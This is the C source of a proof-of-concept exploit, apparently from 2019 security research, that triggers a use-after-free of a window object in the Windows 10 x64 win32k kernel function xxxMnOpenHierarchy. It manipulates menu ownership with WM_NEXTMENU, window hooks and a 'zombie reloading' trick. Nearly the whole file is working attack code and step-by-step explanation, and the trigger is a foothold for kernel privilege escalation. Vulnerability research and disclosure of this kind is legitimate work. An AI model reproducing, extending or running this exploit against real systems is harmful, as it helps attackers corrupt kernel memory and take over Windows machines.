//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #1 - xxxMnOpenHierarchy PWND UAF
// Windows 10 x64
//

/*
This POC showcases a window object UAF inside xxxMnOpenHierarchy.
Most of the complicated code deals with the need to *unlock* the
parent notification window (menu owner window),
to manage to get the last reference of that window to be freed precisely
inside the ThreadUnlock (aka the smashable site) right after the xxxCreateWindowEx inside xxxMnOpenHierarchy.

This POC requires preliminary knowledge in how kernel menus are implemented, but I try to explain it.

We abuse WM_NEXTMENU message behavior for that, because it releases the
permanent locks of the menu-owner-window.
Also this POC shows that sometimes temporary locks are needed to be bypassed too
if their lifetime it too long for the attack to occur in between.

There are multiple major steps that take place in user-mode for this POC:

Step #1 - Enter menu mode which creates and displays a menu window.
		  Note that now the menu owner window is temporarily locked by SendMessage for the whole period of the attack,
		  and we must bypass that for the attack to work!
		  But as long as we continue to run from inside SendMessage and that's the case, we're in a problem.

Step #2 - Find kernel menu's window HWND, we will need it for later use.

Step #3 - Inside menu modal loop once everything is set up, change menu owner window.
		  We do this change, because once a child window is created, it uses this window as its parent.
		  If we didn't do it, then it would have used the original menu owner from step #1,
		  which is temporarily locked and can't be freed!

Step #4 - Menu owner is changing (triggered in #3): closing previous menu (step #5), and opening the new one (step #6)!

Step #5 - Kernel kills previous menu (the one from step #2), but we deny it.
		  This is the clever trick here that the whole POC is based on.
		  See step #7.

Step #6 - Kernel displays a new menu window hence creating the child window.
		  As result of step #3 (changing ownership).

Step #7 - Inside child creation, change menu owner once again!
		  Now, we change the owner once again,
		  this will unlock the permanent locks on the previous owner window which is the parent for the child.
		  Meaning that we managed to get the parent window out of temporary locks and also from all permanent locks!
		  The only lock the parent window now has, is the one from the ThreadLock to wrap the call to xxxCreateWindowEx
		  to create the child.

		  But there's a catch here, things are still not that simple.
		  If we PostMessage to trigger the WM_NEXTMENU message, it will happen much later (in the message pump - menu loop),
		  and attack won't be able to work.
		  We need to force it to happen right now in a synchrnous fashion.
		  The trick was to use a kernel menu window.
		  Once we SendMessage to it (unlike PostMessage on step #3), it will trigger the WM_NEXTMENU code immediately!

		  Smashing is ready.

Step #8 - Set new owner.

Step #9 - Zombie reloading dance - kill n link parent and child window together.

Step #10 Final - xxxMnOpenHierarchy is now UAFing child window pointer.

This is the stack trace of how we get inside xxxMnOpenHierarchy (notice it starts from SendMessage at #19, which is step #1):
0c win32kfull!xxxMNOpenHierarchy+0x41d
0d win32kfull!xxxMNKeyDown+0x9a4
0e win32kfull!xxxMNKeyDown+0x37b
0f win32kfull!xxxMenuWindowProc+0xe74
10 win32kfull!xxxSendTransformableMessageTimeout+0x466
11 win32kfull!xxxSendMessage+0x2c
12 win32kfull!xxxHandleMenuMessages+0x571
13 win32kfull!xxxMNLoop+0x3d9
14 win32kfull!xxxMNKeyFilter+0x194
15 win32kfull!xxxSysCommand+0x96009
16 win32kfull!xxxRealDefWindowProc+0x836
17 win32kfull!xxxWrapRealDefWindowProc+0x60
18 win32kfull!NtUserfnDWORD+0x2c
19 win32kfull!NtUserMessageCall+0x101
1a nt!KiSystemServiceCopyEnd+0x25
*/

#include <windows.h>
#include <stdio.h>

HWND g_hMenuOwner = NULL; // Window (menu) owner of menu mode.
HWND g_hFirstMenuWnd = NULL; // Kernel menu window.
HWND g_hNewOwner = NULL; // Future window (menu) owner.
HMENU g_hMenu = NULL; // The menu hierarchy to work with.

// This is the child window that is created in xxxMnOpenHierarchy, and our final victim window for the UAF.
HWND g_child = NULL;

HHOOK hHook = NULL, hHook2 = NULL, hHook3 = NULL;

// State tracking helpers.
int firstOwnerChanged = 0, childCreation = 0;

// This hook will catch the first menu window created by the kernel.
// And we need to keep it alive, so we do a second time flow of wm-nextmenu from the kernel (otherwise it's not possible...).
// So keeping this menu window alive, while it's still attached to the menu mode of the thread,
// we can set back the original menu owner in the second time of wm-nextmenu handler below.
LRESULT CALLBACK firstMenuHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	LPCBT_CREATEWNDA p = (LPCBT_CREATEWNDA)lParam;
	if ((nCode == HCBT_CREATEWND) && (NULL == g_hFirstMenuWnd))
	{
		ATOM a = (ATOM)GetClassLongPtr((HWND)wParam, GCW_ATOM);
		if (a == 0x8000) // Verify it's a menu window
		{
			printf("Step #2:\n");
			printf("Creating menu window: %I64x\n", wParam);
			g_hFirstMenuWnd = (HWND)wParam;
		}
	}

	if ((nCode == HCBT_DESTROYWND) && ((HWND)wParam == g_hFirstMenuWnd))
	{
		printf("Step #5:\n");
		printf("Deny killing first menu window\n");
		return 1;
	}

	return 0;
}

// This hook is used to do the zombie reloading, so we're called from xxxHandleOwnerSwitch, where we can destroy both windows.
// Then, once we're back from this hook, inside the kernel, it will lock the parent and child, so next time the parent is unlocked,
// it will get released and take down the child window with it.
LRESULT CALLBACK shellOwnerHookProc(int n, WPARAM w, LPARAM l)
{
	if (n == HSHELL_WINDOWDESTROYED)
	{
		static int once = 1;
		if (once)
		{
			printf("Step #9:\n");
			printf("Kill and link inside shell hook is being done now\n");
			once = 0;
			UnhookWindowsHookEx(hHook3);

			// Finally we destryo both the parent and the child.
			DestroyWindow(g_hNewOwner);
			DestroyWindow(g_child);
		}
	}
	return 0;
}

// This hook procedure is called inside CreateWindow of the new menu child window,
// the one we want to eventually turn into a UAF.
// Here, we have to destroy it and the parent window too, and link them together,
// so once the parent is freed, it will take down the child too.
LRESULT CALLBACK childMenuHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PCWPSTRUCT p = (PCWPSTRUCT)lParam;
	if (childCreation && (p->message == WM_CREATE))
	{
		ATOM a = (ATOM)GetClassLongPtr(p->hwnd, GCW_ATOM);
		if (a == 0x8000) // Verify it's a menu window (and not IME or others...)
		{
			printf("Kernel creating the child window: %p\n", p->hwnd);

			UnhookWindowsHookEx(hHook);
			UnhookWindowsHookEx(hHook2);

			// Now here we need to do the attack.
			// Unlock the notification window from the menu, by assigning a new one.
			// Destroy the parent once, make sure that it's linked to this newly created window too.
			// Continue execution will get to ThreadUnlock that will kill this child window before it's being used.

			// 1. The first problem is that the parent of this window is the top level window (our original menu window owner),
			// which is always locked, so we need to change the owner to the new menu window owner.
			// 2. The owner window (since this window isn't a child) is also set to the same parent window.
			// Though, that will get unlinked when destroyed on the first time.

			// Actions:
			// 1. kill parent && simultaneously set parent window owner as the child
			// 2. Parent window is locked as menu notification window, so reset it with next menu trick
			// 3. Once we return, ThreadUnlock will be the last reference, and take down this newly created window with it
			// 4. A race is open to catch the freed tagwnd structure/pointer

			// First try to change the menu owner window again to the previous one.
			printf("Step #7:\n");
			printf("Reset notification window\n");
			SendMessage(g_hFirstMenuWnd, WM_KEYDOWN, VK_LEFT, 0); // Force ownership changing!
			// After this send message is back, the notification window is back to the original menu owner.
			// Meaning that our new owner window last ref is really the ThreadLock and ThreadUnlock surrounding the xxxCreateWindowEx call to create the new popup menu window.
			// Technically it has a parent window (the original menu window owner), but the active call to DestroyWindow will unlink it too, so we're good.
			// Meaning that if we destroy the new owner, it will get destroyed again in the ThreadUnlock function, as we need, and take down this newly created window, thus UAF.

			printf("Kill n link\n");
			HWND h = p->hwnd; // We got the HWND of the kernel menu child window.
			g_child = h; // Remember it so we can kill it soon.

			// Prepare for zombie reloading now:
			// Ownership-attachment zombie reloading is done inside xxxSetWindowLong which calls xxxHandleOwnerSwitch,
			// which does a shell hook callback to user-mode, and then attach both windows together as owner-ownee relationship.

			// Make IsTrayWindow return true... needed so our shell hook proc gets called from inside the xxxHandleOwnerSwitch.
			SetWindowLongPtr(h, GWL_EXSTYLE, WS_EX_APPWINDOW);

			hHook3 = SetWindowsHookEx(WH_SHELL, shellOwnerHookProc, NULL, GetCurrentThreadId());
			SetWindowLongPtr(h, GWLP_HWNDPARENT, (LONG_PTR)NULL); // Reset temporary owner window.
			SetWindowLongPtr(g_hNewOwner, GWLP_HWNDPARENT, (LONG_PTR)NULL); // Reset temporary owner window.
			// This is where we do zombie reloading and couple/link both windows together.
			SetWindowLongPtr(g_hNewOwner, GWLP_HWNDPARENT, (LONG_PTR)h); // Now set again, so it will call the hook.

			printf("Step #10 - Final\n");
			// Once we're back to kernel to xxxCreateWindowEx it will return to xxxMnOpenHierarchy,
			// which is now doing a UAF on the child window pointer.
		}
	}
	return 0;
}

// This is the window procedure for the menu owner window that gets all notifcations from the menu mode code in the kernel.
LRESULT CALLBACK wndproc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	// We get this message from inside menu loop, we can start the attack flow.
	if (msg == WM_ENTERIDLE)
	{
		printf("Step #3\n");
		printf("Idle: %p\n", hWnd);
		static int once = 1;
		if (once)
		{
			once = 0;
			// This will trigger the wm-netmenu flow, where we can change the menu owner window.
			PostMessage(hWnd, WM_KEYDOWN, VK_LEFT, 0);
		}
	}

	// This is the main trick to be able to get the parent window last ref on that ThreadUnlock
	// after xxxCreateWindow in the xxxMnOpenHierarchy function.
	if (msg == WM_NEXTMENU)
	{
		printf("Next menu\n");
		static int counter = 0;
		if (counter == 0)
		{
			counter++;

			printf("Step #4\n");

			// In the first time, we return the new owner (which is a child to original owner).
			PMDINEXTMENU p = (PMDINEXTMENU)lParam;
			p->hmenuNext = g_hMenu;
			p->hwndNext = g_hNewOwner;
			firstOwnerChanged = 1;
		}
		else if ((counter == 1) && childCreation)
		{
			counter++;
			printf("Step #8:\n");

			// On the second time, we're now doing it from inside the child's xxxCreateWindow callbacks to user-mode.
			// We want to give another menu window, just so it will unlink the 'new-owner' window we previously set.
			// So we actually reduce its reference count by 1, otherwise it will stay locked until menu mode is over and we can't attack it.
			PMDINEXTMENU p = (PMDINEXTMENU)lParam;
			p->hmenuNext = g_hMenu;
			// Set it back to the original owner (anything can work as long as we change it, so it releases previous owner).
			p->hwndNext = g_hMenuOwner;

			printf("Second time wm-nextmenu!\n");
		}
		return 0;
	}

	// This message is sent from xxxMnOpenHierarchy just before the child is created,
	// so we use it as a hint that we're on good flow of the attack.
	if (msg == WM_INITMENUPOPUP)
	{
		static int once = 1;
		if (firstOwnerChanged && once)
		{
			once = 0;
			childCreation = 1;

			printf("Step #6:\n");
			printf("Open menu hierarchy: %p\n", hWnd);
			// We hook again, to catch the creation of the new child window that xxxMnOpenHierarchy creates using xxxCreateWindow.
			hHook = SetWindowsHookEx(WH_CALLWNDPROC, childMenuHookProc, NULL, GetCurrentThreadId());
		}
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

int main()
{
	WNDCLASS wc = { 0 };
	wc.lpszClassName = "someclass";
	wc.lpfnWndProc = wndproc;
	RegisterClass(&wc);

	// Just create a few menus in a hierarchy, so we can open a submenu later...
	HMENU hMenu = CreateMenu();
	HMENU hMenu2 = CreatePopupMenu();
	HMENU hMenu3 = CreatePopupMenu();
	InsertMenu(hMenu3, 0, MF_STRING | MF_BYPOSITION, 1, "hello3");
	InsertMenu(hMenu2, 0, MF_POPUP | MF_BYPOSITION, (UINT_PTR)hMenu3, "hello2");
	InsertMenu(hMenu2, 1, MF_POPUP | MF_BYPOSITION, (UINT_PTR)hMenu3, "hello1");
	InsertMenu(hMenu, 0, MF_POPUP | MF_BYPOSITION, (UINT_PTR)hMenu2, (LPCSTR)"&hi");
	g_hMenu = hMenu;

	g_hMenuOwner = CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, hMenu, NULL, NULL);
	// Window has to be active.
	ShowWindow(g_hMenuOwner, SW_SHOW);

	// Basically in order to release the original menu owner we just created above, we need to give it a new one.
	// A restriction enforced by menu loop: New owner must be child of original owner. We can later on unlink them anyway
	// (otherwise mnloop will exit on us and menu mode won't work).
	g_hNewOwner = CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU | WS_CHILD, 0, 0, 0, 0, g_hMenuOwner, NULL, NULL, NULL);

	printf("Owner window: %p, new owner: %p\n", g_hMenuOwner, g_hNewOwner);
	// Once we start a menu mode, it creates an actual (menu) window to draw the menu items on.
	// We need to find that window in order to manipulate it, therefore the following CBT hook will catch window-creation.
	/*
	00 win32kfull!xxxCreateWindowEx
	01 win32kfull!xxxMNOpenHierarchy + 0x3ef
	02 win32kfull!xxxMNKeyDown + 0x9a4
	03 win32kfull!xxxMNChar + 0x39c
	04 win32kfull!xxxMNKeyFilter + 0x8b
	05 win32kfull!xxxSysCommand + 0x96009
	06 win32kfull!xxxRealDefWindowProc + 0x836
	07 win32kfull!xxxWrapRealDefWindowProc + 0x60

	This flow happens from the SendMessage below.
	*/
	hHook2 = SetWindowsHookEx(WH_CBT, firstMenuHookProc, NULL, GetCurrentThreadId());

	printf("Step #1\n");

	// Enter menu mode for our owner window (everything else happens through the callbacks).
	// Menu has its own kernel modal loop to process messages and events.
	SendMessage(g_hMenuOwner, WM_SYSCOMMAND, SC_KEYMENU, (LPARAM)'h');

	return 0;
}
